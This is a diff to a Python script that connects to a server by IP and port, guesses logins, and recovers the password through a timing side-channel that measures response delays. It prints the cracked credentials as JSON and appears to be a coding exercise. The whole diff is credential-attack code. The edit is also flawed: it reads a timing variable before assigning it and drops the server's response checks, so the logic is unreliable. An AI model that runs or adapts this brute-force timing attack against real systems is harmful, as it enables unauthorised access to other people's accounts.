@@ -3,7 +3,7 @@ import argparse
 import string
 import itertools
 import json
-
+import time
 
 BUFFER_SIZE = 1024
 
@@ -27,7 +27,7 @@ def send_message(client_socket, login, password):
 
 def generate_password():
     valid_chars = string.ascii_letters + string.digits + string.punctuation
-    for password in itertools.product(valid_chars):
+    for password in valid_chars:
         yield ''.join(password)
 
 
@@ -51,19 +51,25 @@ def main(ip_address, port):
         login = next(login_generator)
         password_generator = generate_password()
         password = next(password_generator)
+        base_start_time = time.perf_counter()
         response = send_message(client_socket, login, password)
+        base_end_time = time.perf_counter()
+        base_response_time = base_end_time - base_start_time
 
         while response["result"] != "Connection success!":
 
             if response["result"] == "Wrong login!":
                 login = next(login_generator)
-            elif response["result"] == "Wrong password!":
+            elif exception_response_time - base_response_time < 0.1:
                 password = password[:-1] + next(password_generator)
-            elif response["result"] == "Exception happened during login":
+            elif exception_response_time - base_response_time >= 0.1:
                 password_generator = generate_password()
                 password = password + next(password_generator)
 
+            exception_start_time = time.perf_counter()
             response = send_message(client_socket, login, password)
+            exception_end_time = time.perf_counter()
+            exception_response_time = exception_end_time - exception_start_time
         success_output = {"login": login, "password": password}
         print(json.dumps(success_output))
 
